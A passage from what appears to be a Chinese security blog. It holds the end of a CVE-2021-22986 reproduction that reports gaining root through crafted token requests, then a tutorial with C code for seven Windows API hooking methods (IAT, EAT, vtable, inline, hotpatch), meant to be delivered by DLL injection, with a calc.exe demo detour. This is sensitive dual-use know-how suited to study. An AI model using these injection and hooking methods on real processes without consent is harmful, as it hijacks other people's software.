首先我们需要构造POST报文获取生成Token，然后使用该Token再次生成报文从而拿下系统权限。\n 获取Token的报文  得到的response报文\n 攻击报文  可以看到返回的报文body显示当前权限为root权限\n0x4 总结 总结？总结都在前言写完了。这次博客写的真的很过瘾！虽然SSRF还是弄不太懂，虽然很多关键结论都是直接采用其他师傅的，而这些关键结论，以我现在的能力也很难获取，但是这次学习以及实现，是我第一次复现CVE，也让我深刻感受到，一个成果的获取，真的很困难，对能力的要求也非常的高，安全研究的路，崎岖。即便如此，我仍然愿意走下去。\n","permalink":"http://int80.top/cve-2021-22986/","tags":["CVE"],"title":"CVE-2021-22986"},{"categories":["逆向"],"contents":"0x0 前言 既然前面我们都写了DLL注入工具，那当然得接着学习Hook技术了啊。使用我们写的DLL注入工具，在目标DLL里写上Hook代码，如此就能将DLL注入技术与Hook技术结合进行联合使用。\n因为HOOK技术是有针对性的，因此该项目以MessageBox函数为例进行编写，项目中需要更改的地方都放在一起并且已经进行标注，当使用的时候可以按照标注更改为目标HOOK函数的信息即可。\n代码中的标注如图1所示:\n图1.代码标注示例 此项目一共实现了七种HOOK技术，如图2所示：\n图2.Hook技术实现列表 该博客也就围绕这7种HOOK技术进行解析，其中HookTest 与 VirtualTableHookTest分别为测试用的Hook的目标程序以及测试用的虚表Hook的目标程序。\n该项目参考《加密与解密》Hook技术章节代码而完成\n项目地址:\nHookTechniques\n0x1 一些需要的概念 首先是通用的Hook流程，示意图如图3:\n图3.通用Hook流程 从示意图我们可以很明确的得到一个信息，HOOK就是插入特定代码以干预程序的执行流程。在程序执行真正的目标函数前，先执行我们的代码，这样就获得了程序执行过程的决定权，这也就是HOOK的目的所在。\n图中的Detour(翻译为绕道)函数，就是我们插入用来干预原执行流程的代码。Trampoline(翻译为跳板)函数，作用是还原并执行因跳转去执行Detour函数导致目标函数中没有被执行的指令，这样可以最大程度避免程序执行出错。\nHOOK技术共可分为3类，第一类为 Address Hook，该类方法是通过修改数据进行Hook，但修改的数据多为函数的地址或其偏移量。当函数被调用时，函数的地址就会被保存在RIP寄存器中，因此我们将这些地址替换成Detour函数地址即可获得程序控制权。\n第二类为InlineHook，该类方法是直接修改指令进行Hook，核心为通过jmp，call，ret之类的指令转移程序的执行流程，从而实现执行Detour函数获得程序控制权。\n第三类为基于异常处理机制的Hook，该类方法是将Detour函数向目标进程注册为异常处理程序，然后手动触发异常或中断，让程序跳转至异常处理程序，这样也能让程序执行到Detour函数并获得程序控制权。\n0x2 Address Hook 0x2.1 IAT Hook 在PE文件中，一个DLL对应一个IMAGE_IMPORT_DESCRIPTOR结构体，而该结构体又存在一个IAT，因此一个DLL对应一个IAT，IAT用于保存该DLL的导出函数的地址。又因为在PE文件加载过程中就会完成IAT的重建，因此修改IAT并不会影响原DLL的导出函数的地址，即IAT Hook不能拦截LoadLibrary或GetProcAddress的调用方式。\nIAT Hook的原理很简单，遍历所有IMAGE_IMPORT_DESCRIPTOR结构体的Name成员，寻找属于目标函数所在的DLL的结构体，然后再遍历该结构体的IAT数组，寻找目标函数的地址，然后保存旧地址，更新新地址。\n流程图：\n图4.IATHook流程图 核心代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  // 获取目标函数地址 g_pOrgFunc = (FARPROC)GetProcAddress(GetModuleHandle(hModToHook), hFuncToHook); // 挂钩 // 遍历IID结构体 while (pImportDescriptor-\u0026gt;Characteristics \u0026amp;\u0026amp; pImportDescriptor-\u0026gt;FirstThunk != NULL) { // 如果IID结构体的Name成员值为目标函数所属DLL的名称 \tszLibName = (LPCSTR)(uiBaseAddr + pImportDescriptor-\u0026gt;Name); if (!_strcmpi(szLibName, szDllName)) { //获取IAT地址 \tpThunk = (PIMAGE_THUNK_DATA)(uiBaseAddr + pImportDescriptor-\u0026gt;FirstThunk); // 遍历IAT数组 \tfor (; pThunk-\u0026gt;u1.Function; pThunk++) { // 判断IAT数组当前值是不是目标函数的地址 \tlpAddr = (ULONG_PTR*)pThunk; if ((*lpAddr) == (ULONG_PTR)pfnOrg) { // 让IAT所在内存获得可读写权限  MEMORY_BASIC_INFORMATION mbi; VirtualQuery(lpAddr, \u0026amp;mbi, sizeof(mbi)); VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, \u0026amp;dwOldProtect); // 保存旧地址，更新为Detour函数地址  // 保存旧地址是为了能执行完Detour后还能继续执行目标函数，以及脱钩  g_pToIATThunk = lpAddr; *lpAddr = (ULONG_PTR)pfnNew; // 恢复内存权限  VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize, dwOldProtect, \u0026amp;dwOldProtect); return TRUE; } } } // 移动到下一个IID结构体判断  else pImportDescriptor++; } // 脱钩 // 让IAT所在内存获得可读写权限 VirtualQuery((LPCVOID)g_pToIATThunk, \u0026amp;mbi, sizeof(mbi)); VirtualProtectEx(hProcess, mbi.BaseAddress,mbi.RegionSize, PAGE_EXECUTE_READWRITE, \u0026amp;dwOldProcetect); *g_pToIATThunk = (ULONG_PTR)g_pOrgFunc; // 恢复内存原权限 VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize, dwOldProcetect, \u0026amp;dwOldProcetect); //测试用Detour int WINAPI MyDetourFunc( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType ) { int ret; WinExec(\u0026#34;C:\\\\Windows\\\\System32\\\\calc.exe\u0026#34;, SW_SHOW); ret = ((PFN_MessageBoxA)g_pOrgFunc)( hWnd, lpText, lpCaption, uType); return ret; }   我们通过x64dbg来查看IAT的变化，首先是DLL注入前，IAT的数据如图5所示:\n图5.IAT修改前 我们跳转至IAT数组第一个地址处\n图6.IAT修改前的函数 可以看出目前该地址还是MessageBox的函数地址，现在我们将DLL注入，再次检查IAT\n图7.IAT修改后 对比图5，我们发现IAT数组的第一个数据发生了变化，也就是我们改变了MessageBox函数的地址，我们查看该地址的数据，\n图8.IATHook的Detour函数 发现MessageBox函数的地址被改成了Detour函数的地址，该函数在最后又跳回到了原MessageBox函数，该函数地址保存在g_pOrgFunc全局变量中。\n我们还能看到测试用exe文件的代码，原来是Call MessageBox，现在却变成了Call My_Detour函数，对比着看图9与图10：\n图9.IATHook改变前的代码 图10.IATHook改变后的代码 综上，IAT Hook的技术可以有效改变程序执行流程。\n0x2.2 EAT Hook 对比IAT Hook技术，EAT Hook就是更改目标DLL的导出函数的地址了。但是与IAT不同的是，EAT中的函数地址为相对DLL基址的RVA，因此我们写入Detour函数的地址时要减去DLL基址，再写入EAT中。\nEAT Hook存在一个问题，当目标进程加载之内存时，就会重建IAT，将里面的数据更新为DLL的函数地址，而重建的数据就是通过DLL的EAT获取函数地址。因此只有进程在重建IAT之前HOOK或是HOOK之后，目标进程再次通过GetProcAddress获取函数地址，才会受到该HOOK技术的影响。因此该方法解决了IAT HOOK技术不能HOOK动态调用的函数的问题。\n因此，测试用EXE文件中，需要通过GetProcAddress获取函数地址，并定义目标函数，通过函数地址进行调用目标函数才能测试是否HOOK成功\n流程图:\n图11.EATHook流程图 核心代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  // 获取目标函数相对DLL基址的RVA g_hModule = GetModuleHandle(hModToHook); g_pOrgFunc = (ULONG_PTR)GetProcAddress(g_hModule, hFuncToHook); g_pOrgFunc = (ULONG)(g_pOrgFunc - (ULONG_PTR)g_hModule); // 挂钩 hProcess = GetCurrentProcess(); uiBaseAddr = (PBYTE)g_hModule; // 获取EAT地址 uiNtHeader = uiBaseAddr + ((PIMAGE_DOS_HEADER)uiBaseAddr)-\u0026gt;e_lfanew; pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uiBaseAddr + ((PIMAGE_NT_HEADERS)uiNtHeader)-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); FuncAddr = (PULONG)(uiBaseAddr + pExportDir-\u0026gt;AddressOfFunctions); // 遍历EAT中的AddressOfFunctions数组寻找目标函数所在位置 while (*FuncAddr) { // 如果遍历到的值与目标函数的RVA相同  if (*FuncAddr == g_pOrgFunc) { // 修改EAT所在内存空间的权限为可读写  MEMORY_BASIC_INFORMATION mbi; VirtualQuery(FuncAddr, \u0026amp;mbi, sizeof(mbi)); VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, \u0026amp;dwOldProtect); // 保存旧地址  g_pToEATThunk = (PULONG_PTR)FuncAddr; // 更新为Detour函数的相对DLL基址的RVA  *FuncAddr = (ULONG)((ULONG_PTR)pfnNew - (ULONG_PTR)g_hModule ) ; // 恢复内存原权限  VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize, dwOldProtect, \u0026amp;dwOldProtect); } else FuncAddr++; } // 脱钩 // 修改EAT所在内存空间的权限为可读写 VirtualQuery((LPCVOID)g_pToEATThunk, \u0026amp;mbi, sizeof(mbi)); VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, \u0026amp;dwOldProcetect); // 还原EAT *g_pToEATThunk = (ULONG)g_pOrgFunc; VirtualProtectEx(hProcess, mbi.BaseAddress, mbi.RegionSize, dwOldProcetect, \u0026amp;dwOldProcetect);   这里还存在一个问题，因为EAT中的AddressOfFunctions数组存的是为双字大小的RVA，因此会受到一些限制。再64位系统中，如果目标DLL的基址大于Detour函数的地址，这样求Detour函数的RVA就会出现负数，也即四字的RVA，若转换成双字后，RVA的值发生了变化，就会导致记录的Detour函数的RVA+DLL基址得到错误的Detour地址，这样就会导致跳转至错误地址导致崩溃。\n举个例子：\n在EATHook中计算Detour RVA的地方添加printf打印出实际Detour地址，DLL基址，以及计算得到的Detour RVA的数据，并再反过来计算Detour地址。结果如下:\n图12.EATHook中地址计算错误 如图12所示，当DLL基址大于实际Detour地址时，计算出的Detour 相对DLL基址的RVA是负数，并且在转化为双字的时候，Detour的RVA值发生了变化，变成了一个正数。并且逆向去计算Detour绝对地址时得到的结果与实际Detour地址不同。因此对于这种情况EATHOOK是失败的，并且会导致程序执行流发生错误。\n因此在使用EAT的时候需要注意这个问题。\n0x2.3 VirtualTable Hook 在C++中存在虚函数以及重载的特性，对虚函数重载可以允许子类以相同的接口实现与基类不同的功能。实现这个特性就是通过一个叫虚地址表(Virtual Function Table)的东西来实现的。虚表中存储着虚函数的地址，最开始没有子类重载基类的虚函数时，该表存储的虚函数地址为基类中的虚函数地址，当子类重载基类的虚函数后，虚表存储的虚函数地址就会更改为子类重载后的函数地址。其实这个思路和HOOK的思路完全一样，也是替换地址。\n因此通过这个特性，我们可以更改虚表中存储的虚表地址为我们的Detour函数地址，当调用该虚函数时就能执行到Detour函数，从而获取进程的控制权了。\n存在虚函数成员的类中，类的第一个元素就是虚表的地址，即类起始地址就是虚表的地址。当HOOK代码通过DLL注入时，我们首先需要获得虚表的地址。我在VirtualTableHookTest代码中直接printf了虚表的地址，因此可以很方便的更改DLL写入的虚表地址。\n流程图：\n图13.vfTableHook流程图 核心代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  //获取目标虚函数所在类的虚表地址 PULONG_PTR pvfTableToHook = 目标虚函数所在类的虚表地址 // 挂钩 // 让Trampoline类的虚表所在内存获得可读写权限 ULONG_PTR* vfTableTrampoline = (ULONG_PTR*)*(ULONG_PTR*)\u0026amp;Trampoline; VirtualQuery(vfTableTrampoline, \u0026amp;mbi, sizeof(mbi)); VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, \u0026amp;dwOld); // 将原虚函数地址保存在Trampoline类虚表中 vfTableTrampoline[0] = pvfTableToHook[0]; // 恢复内存原权限 VirtualProtect(mbi.BaseAddress, mbi.RegionSize, dwOld, 0); // 让目标虚函数所在类的虚表所在内存获得可读写权限 VirtualQuery(pvfTableToHook, \u0026amp;mbi, sizeof(mbi)); VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, \u0026amp;dwOld); // 将目标类的虚表对应的虚函数地址替换为Detour类的虚表中保存的第一个函数地址 ULONG_PTR* vfTable = (ULONG_PTR*)*(ULONG_PTR*)\u0026amp;Detour; pvfTableToHook[0] = (ULONG_PTR)vfTable[0]; // 恢复内存原权限 VirtualProtect(mbi.BaseAddress, mbi.RegionSize, dwOld, 0); // 脱钩 // 让Trampoline类的虚表所在内存获得可读写权限 VirtualQuery(vfTableTrampoline, \u0026amp;mbi, sizeof(mbi)); VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, \u0026amp;dwOld); // 获取原徐函数地址 OrigAddr = vfTableTrampoline[0]; // 恢复内存原权限 VirtualProtect(mbi.BaseAddress, mbi.RegionSize, dwOld, 0); // 让目标虚函数所在类的虚表所在内存获得可读写权限 VirtualQuery(pvfTableToHook, \u0026amp;mbi, sizeof(mbi)); VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, \u0026amp;dwOld); // 恢复虚表所存地址为原徐函数地址 pvfTableToHook[0] = OrigAddr; // 恢复内存原权限 VirtualProtect(mbi.BaseAddress, mbi.RegionSize, dwOld, 0);   在测试Exe文件中，我直接print了目标虚函数所属类的虚表地址，但很多情况下要获取虚表的地址只能通过逆向分析获得。这里我们通过Windbg进行获取。\n首先先简单看一下测试用Exe文件代码，\n测试用Exe文件代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  class MyTest { public: virtual int Add(int a, int b); virtual void g() { cout \u0026lt;\u0026lt; \u0026#34;test::g\u0026#34; \u0026lt;\u0026lt; endl; }; virtual void h() { cout \u0026lt;\u0026lt; \u0026#34;test::h\u0026#34; \u0026lt;\u0026lt; endl; }; void novirtual() { cout \u0026lt;\u0026lt; \u0026#34;test::not virtual\u0026#34; \u0026lt;\u0026lt; endl; }; }; int MyTest::Add(int a, int b) { printf(\u0026#34;Test::Add\\n\u0026#34;); return a + b; } int main() { MyTest test; MyTest* ptest = \u0026amp;test; ptest-\u0026gt;Add(1, 2); ULONG_PTR vfTable = *(ULONG_PTR*)ptest; getchar(); ptest-\u0026gt;Add(1, 2); getchar(); return 0; }   从测试用代码可以test是类的对象，因此需要执行到定义对象后，通过对象指针获取虚表地址。\n给代码第一个getchar()打上断点，然后执行于此，再查看test变量的值。\nWindbg命令如下:\n1 2 3 4  bp \u0026lt;目的断点地址\u0026gt; g dv //查看变量名 dt \u0026lt;目标变量\u0026gt;   在windbg中即可获得虚表地址\n图14.Windbg中获取虚表地址 通过图14的结果可以看到test对象的起始地址即为_VFN_table，即虚表地址。测试用Exe也打印出了虚表的地址，如图15所示，两者相同，因此windbg获取到的虚表地址正确。\n图15.测试Exe文件打印的虚表地址 在Windbg从内存窗口查看该地址的数据，得到图16的信息\n图16.HOOK前的虚表数据 可以看到该虚表中只有3个虚函数的地址，这与我们定义的基类里面的虚函数数量相同。又因为DLL的代码Hook的是虚表中保存的第一个函数地址，因此查看第一个函数地址是什么函数的。\n图17.HOOK前目标虚表保存的第一个函数地址是Add函数的 虚表将Add虚函数地址保存在第一个位置处，这与测试用Exe文件中基类里虚函数定义的顺序相同。\n此时将虚表地址填入DLL中，\n图18.DLL中修改虚表的地方 重新生成DLL后，在测试用Exe文件中第二次调用ptest-\u0026gt;Add()代码处打上断点，然后注入DLL。\n当DLL注入后，虚表保存的函数地址发生了改变，如图19所示，可以与图16对比查看\n图19.Hook后的虚表数据 查看改变后的函数地址是哪个函数的\n图20.Hook后的虚表存放的第一个函数地址是DetourFun函数的 当DLL注入后对虚表Hook成功，将程序执行完成可以发现，再次调用Add函数，执行流程从打印“Test::Add\u0026quot;变成了先弹出窗口再打印。\n图21.Hook虚表后的结果1 图22.Hook虚表后的结果2 综上，当C++程序中存在虚函数时，我们便可以通过虚表Hook技术获取程序控制权。\n0x3 Inline Hook Inline Hook的原理是通过修改目标函数的指令为jmp、call、ret等类似指令跳转至Detour函数，因此实现该Hook有许多种方法。例如:\n 直接jmp Detour地址； push Detour地址 + ret进行跳转； mov rax(eax)，Detour地址 + jmp rax(eax)； 更改掉call 的地址； Hotpatch 方式；  因为核心原理都相同，我只实现了三种。\n0x3.1 jmp Detour(5字节) 最简单以及最直观的Inline Hook方法就是直接将目标函数的第一条指令更改为jmp Detour地址指令，在执行Detour函数时，首先恢复目标函数被更改的指令，然后再执行目的代码，最后再挂钩便于重复HOOK。\n流程图:\n图23.5字节InlineHook流程图 核心代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  // 存储HOOK 前的代码 BYTE oldCode[5]; // 存储HOOK 后的代码 BYTE newCode[5] = {0xE9,0,}; // 挂钩 // 获取目标函数地址 HookData.HookAddr = (ULONG_PTR)GetProcAddress(GetModuleHandleA(HookData.szApiDllName), HookData.szHookApiName); // 判断目标函数是否已经被Hook了 pByte = (PBYTE)HookData.HookAddr; // 被Hook则不进行挂钩 if (pByte[0] == 0xE9) return FALSE; // 将jmp指令与Detour函数地址写入目标函数的前五个字节 hProcess = GetCurrentProcess(); ReadProcessMemory(hProcess, (LPCVOID)HookData.HookAddr, HookData.oldCode, HookData.HookCodeLen, 0); // 计算相对地址，公式为目标地址-当前地址-指令长度 * (ULONG*)(HookData.newCode + 1) = (ULONG)HookData.pfnDetourFun - (ULONG)HookData.HookAddr - 5; WriteProcessMemory(hProcess, (LPVOID)HookData.HookAddr, HookData.newCode, HookData.HookCodeLen, 0); // 脱钩 // 如果挂钩才进行脱钩，将原指令恢复 if (pByte[0] == 0xE9) { WriteProcessMemory(GetCurrentProcess(), (LPVOID)HookData.HookAddr, HookData.oldCode, HookData.HookCodeLen, 0); return TRUE; } // Detour函数模板 Unhook() //脱钩 .... //执行目的代码 Hook() //挂钩   在5字节的Inline Hook方法中，我并没有直接定义Trampoline函数，而是通过先脱钩再执行目的代码的方法来代替trampoline函数的功能，但是挂钩再脱钩的方法比执行trampoline函数更麻烦也更容易出错，特别是在多线程的程序中，我们需要给目标函数挂钩，当一个线程调用挂钩的目标函数后会脱钩，此时另一个线程在脱钩后再次调用目标函数，此时后调用的线程就不会执行Detour函数，那么执行流程就出现了错误。\n我们通过x64dbg进行调试观察该Hook方式。\n首先是64位进程，Hook前 MessageBox函数指令如下图24所示:\n图24.5字节Hook前64位MessageBox函数 把DLL注入进目标进程中，进行挂钩，此时Hook后的MessageBox函数指令如下图25所示:\n图25.5字节Hook后64位MessageBox函数 在地址7FFFB5B2AC10中，sub rsp,28指令变成了 jmp指令，并且jmp的地址正是Detour函数。\n同时我们还会发现原7FFFB5B2AC14地址的xor r11d,r11d 变成了7FFFB5B2AC15地址的xor ebx,ebx，这是因为原来函数的起始地址为4字节，写入5字节的jmp指令打乱了原指令的字节对齐，导致产生了指令碎屑。但是因为我们执行原函数时已经脱勾还原，因此不会影响程序运行。如果我们使用trampoline函数，我们需要用nop将指令碎屑替代，并且将因更改指令，而变成指令碎屑的指令也写入trampoline函数中执行，以保证程序的完整性。\n我们再看32位进程下该Hook技术的执行过程。\n32位和64位环境下的MessageBox函数指令不相同，32位的指令如图26所示\n图26.5字节Hook前32位MessageBox函数 32位的MessageBox函数的前三行指令总长为5，这也是为什么会出现jmp Detour地址这种5字节的Inline Hook技术，因为最开始就是针对32位环境下的Windows系统库函数，一些库函数的起始指令就和MessageBox相同，mov edi,edi无意义直接，后两条指令就是建立栈帧，刚好5字节，因此可以不产生指令碎屑的替换。\n将DLL注入后，再次查看指令的变化\n图27.5字节Hook后32位MessageBox函数 当前五指令替换后，并未产生指令碎屑，并且jmp跳转的也正是Detour函数。因为我们替换掉了建立栈帧的指令，如果继续执行原函数时不脱勾或者不执行trampoline函数保持原函数完整性，那么就会出错。因此在Hook的过程中最重要的就是保证指令运行的完整性。\n0x3.2 HotPatch HotPatch(热补丁)修改的是7个字节的指令因此又称7字节代码修改技术。\n为什么会出现修改7字节的指令的技术？我们可以先看看几个32位环境下的Windows库函数的起始地址前的指令。\n图28.32位MessageBox函数 图29.32位LoadLibrary函数 可以看到这两个函数起始地址前都至少有5个0xCC的int3 指令，再加上两个字节的 mov edi,edi指令，一共7个字节。这7个字节对于原函数来说都是无意义的，更改这几个字节不会影响原函数指令的完整性就不会导致进程执行流异常或者崩溃，因此7字节的代码修改方法要比5字节的修改方法稳定得多。函数前留下无意义的指令就是为了能方便通过Hook打上补丁，又因为是在进程运行时打补丁，所以才被称为HotPatch(热补丁)。\n但7字节代码修改方法要求也比5字节高，目标函数中必须在函数起始地址前存在5个无意义指令。\n7个字节中，前5个字节是使用的Far jmp指令(E9 xxxxxxxx)，用于跳转至Detour函数，后两个字节使用的是Short jmp指令(EB F9)，用于跳转至前面的Far jmp指令。\n为什么这里short jmp指令的相对地址写成了固定的F9？这是因为目标地址相对当前地址是固定的。根据相对地址的计算公式 相对地址 = 目标地址 - 当前地址 - 指令长度 =\u0026gt; 相对地址 = (pFunc-5) - pFunc - 2 = -7 = 0xF9。\n流程图：\n图30.InlineHook7字节流程图 核心代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  // 存储HOOK后第一个jmp BYTE newJmp1[2] = { 0xEB,0xF9 }; // 存储HOOK后第二个jmp BYTE newJmp2[5] = { 0xE9,0, }; // 存储HOOK前的Code BYTE OldCode1[5] = { 0xCC,0xCC,0xCC,0xCC,0xCC }; BYTE OldCode2[2] = { 0x8B,0xFF }; // 挂钩 // 获取目标函数地址 HookData.HookAddr = (ULONG_PTR)GetProcAddress(GetModuleHandleA(HookData.szApiDllName), HookData.szHookApiName); // 判断是否挂钩 if (pByte[0] == 0xEB) return FALSE; hProcess = GetCurrentProcess(); // 计算Detour的相对地址并写入jmp指令中 *(ULONG_PTR*)(HookData.newJmp2 + 1) = HookData.pfnDetourFun - HookData.HookAddr; // 将7字节指令替换原函数指令 WriteProcessMemory(hProcess, (LPVOID)(HookData.HookAddr - 5), HookData.newJmp2, HookData.HookCodeLen[0], 0); WriteProcessMemory(hProcess, (LPVOID)HookData.HookAddr, HookData.newJmp1, HookData.HookCodeLen[1], 0); // 脱钩 if (pByte[0] == 0xEB) { // 恢复原函数指令  WriteProcessMemory(GetCurrentProcess(), (LPVOID)(HookData.HookAddr - 5), HookData.OldCode1, HookData.HookCodeLen[0], 0); WriteProcessMemory(GetCurrentProcess(), (LPVOID)HookData.HookAddr, HookData.OldCode2, HookData.HookCodeLen[1], 0); return TRUE; } // Detour函数模板 // 如果需要在执行完目的代码后继续执行原函数 .... // 需要执行的目的函数 pFunc = GetProcAddress(GetModuleHandleA(HookData.szApiDllName), HookData.szHookApiName); pFunc = pFunc + 2; //pFunc为原函数起始地址 + 2即跳过Short jmp到被替换指令的下一条指令 (定义的目标函数类型)pFunc(目标函数参数); //调用目标函数，从函数第二条指令开始执行函数   使用7字节代码修改方法，再次回到原函数继续执行时只需要将原函数起始地址+2，再通过地址调用原函数即可，这样执行的效果与调用原API效果相同。\n通过x64dbg进行调试，查看该Hook技术的实现过程。\n把DLL注入进测试用EXE，让其执行HOOK\n图31.7字节Hook后的32位MessageBox 对比图28，可以发现5个int3指令和mov edi,edi 都被替换成两个jmp指令了，并且Far jmp的目的地址正是我们的Detour函数。\n我们再看下该方法在64位环境下的执行情况。\n64位环境下的MessageBox函数代码已经截图为图24，我们直接看HOOK后的情况\n图32.7字节Hook后的64位MessageBox 可以看到前7个字节已经正常替换为我们希望替换的两条jmp指令，并且Far jmp的目的地址也为Detour函数。因为64位环境下的库函数第一条指令为sub rsp,x ，该指令为4字节而不是2字节，所以7字节代码修改方法在64位环境进行Hook就出现了指令碎屑，如果按照Detour函数中直接通过原函数地址+2的方法调用该函数就会出现程序执行错误，因为原函数指令已经出现错误。\n要是想要64位环境也能使用该方法只能通过加入trampoline函数 将指令碎屑的问题解决(将碎屑改为NOP，并在trampoline函数写入原指令以及受指令替换所影响的指令)，并针对性的将调用该函数的地址调整为第一条不被指令替换所影响的原函数指令地址。\n0x3.3 Inline Hook x64 该方法便是能作为例子解决64位环境下因地址长度，以及函数指令变化导致之前适用于32位却不能适用于64位环境的方法失效的问题。但是依然会出现指令碎屑的问题，但是在MessageBox这个例子中并不会发生。\n该方法与5字节的代码修改方法类似，也是将原指令改变成jmp指令，但是使用的jmp机器码为0xff25，并且使用14个字节，这是因为jmp指令长度为2，但是jmp目标地址只为4字节，而64位系统中地址为8字节，相对地址计算的大小很可能会大于4字节，正如在EAT Hook出现的问题那样，因此需要通过间接跳转来实现以8字节的绝对地址为目的地址的jmp。\n流程图:\n图33.64位InlineHook流程图 核心代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  // 检查目标函数起始指令是否存在jmp指令，有则跳过该指令，将Hook地址定位到下一条指令 pHookData-\u0026gt;HookPoint = SkipJmpAddress(pHookData-\u0026gt;HookPoint); pHookData-\u0026gt;JmpBackAddr = pHookData-\u0026gt;HookPoint + pHookData-\u0026gt;HookCodeLen; // 将要替换的指令准备好，即jmp Detour地址指令的机器码 memset(pHookData-\u0026gt;newEntry, 0, 14); pHookData-\u0026gt;newEntry[0] = 0xFF; pHookData-\u0026gt;newEntry[1] = 0x25; *(ULONG_PTR*)(pHookData-\u0026gt;newEntry + 6) = (ULONG_PTR)pHookData-\u0026gt;pfnDetourFun; // 将原函数指令保存好，并写入跳回原函数指令 PBYTE pFun = (PBYTE)pHookData-\u0026gt;pfnTrampolineFun; memcpy(pFun, (PVOID)pHookData-\u0026gt;HookPoint, 14); // 在原MessageBox中，存在一个cmp指令，该指令使用了一个相对地址，因此对相对地址要进行重定位 //cmp的目标地址与当前地址相差0x38600左右， // 因此我们申请的128字节大小空间不能容纳 cmp取的地址，已经超出我们的范围 // 所以通过申请的内存空间中空余的空间作为该相对地址的目标地址 *(ULONG*)(pFun + 10) = (ULONG)(((ULONG_PTR)pFun + 20) - ((ULONG_PTR)pFun + 14)); pFun += 14; pFun[0] = 0xff; pFun[1] = 0x25; *(ULONG_PTR*)(pFun + 6) = pHookData-\u0026gt;JmpBackAddr; // 挂钩 // 保存原指令 ReadProcessMemory(hProcess, OriginalAddr, pHookData-\u0026gt;oldEntry, pHookData-\u0026gt;HookCodeLen, \u0026amp;dwBytesReturned); // 替换原指令 WriteProcessMemory(hProcess, OriginalAddr, pHookData-\u0026gt;newEntry, pHookData-\u0026gt;HookCodeLen, \u0026amp;dwBytesReturned); // 脱钩 // 恢复原指令 WriteProcessMemory(hProcess, OrigianlAddr, pHookData-\u0026gt;oldEntry, pHookData-\u0026gt;HookCodeLen, \u0026amp;dwBytesReturned);   64位Hook前的MessageBox函数的指令截图为图24了，接下来我们将DLL注入进行Hook，并比较两者发生的变化。\n图34.64位InlineHook后的MessageBox 在以上代码有两个比较明显的问题，首先是为什么要在jmp指令(0xff25)起始地址 + 6 处写入目的地址，而不是 + 2 处直接写在jmp指令后呢？前面我们也说了 jmp指令加上目的地址总共6字节长，其中只有4字节存放目的地址，因此是不足够容纳64位的8字节长地址。如果直接在jmp指令起始地址+2处写入目的地址，那么该指令就会以该地址的低4字节作为目的地址跳转，就会出现错误。\n如果0xff25后面接4个全0字节，此时jmp指令就会取下一地址的值作为目的地址，这样就可以实现8字节长的地址作为目的地址进行跳转了。具体看图34中的第一条和第二条指令。第一条指令中目的地址为全0，但却获取了下一地址的值。再跳转至第二条指令存放的数据作为地址的地方，检查发现为Detour函数地址。\n另一个问题就是Hook前的64为MessageBox函数存在一个cmp指令，而该指令使用了一个相对地址，并取了该相对地址换算得到的目的地址的值进行比较。我们使用14字节刚好覆盖完cmp指令，因此我们会将该指令对应的机器码一同复制到trampoline函数中。这就会导致相对地址不变，而当前地址改变了，根据相对地址的计算公式就会发现换算出来的目的地址发生了变化。此时我们就必须对这种情况进行重定位。第一想法就是计算出原目的地址，减去当前指令所在地址再减去指令长度。但是这也会有一个问题，就是8字节计算相对地址时经常出现的问题，就是计算得到的值的位数大于4字节，那么截断后得到的数再拿来计算目的地址一样会计算错误，导致访问到非法内存空间。\n该想法的计算代码如下:\n1 2 3 4 5 6  ULONG DataOffset; // 计算原目的地址 ULONG_PTR pData = (ULONG_PTR)pHookData-\u0026gt;HookPoint + 7 + 7 + *(ULONG*)(pHookData-\u0026gt;HookPoint + 10); // 计算相对地址 = 目的地址-当前地址-指令长度 DataOffset = (ULONG)(pData - ((ULONG_PTR)pFun + 14)); *(ULONG*)(pFun + 10) = DataOffset;   这样的思路并没有错误，但在64位环境下就会因为位数问题导致错误。\n具体看我举的这个例子\n图35.Hook前的cmp指令 图35为cmp指令Hook前的样子，目的地址为7FFFB5B632F0，相对地址为386D2。\n接着注入DLL，再去查看Trampoline函数中计算出来的相对地址。我将计算相对地址的过程打印，可以用来对比是否是因为位数截断的原因导致内存访问错误。\n图36.64位InlineHook的Trampoline函数 可以看到 Trampoline计算出来的相对地址为23A823E2，指向的目的地址为26FB5B632F0。我们检测一下该地址是否合法\n图37.目的地址非法 我们没办法跳至目的地址，因此该地址并不存在于目标进程的拥有的内存空间中。因此计算出的相对地址结果错误。\n再检查下计算过程，\n图38.相对地址计算过程 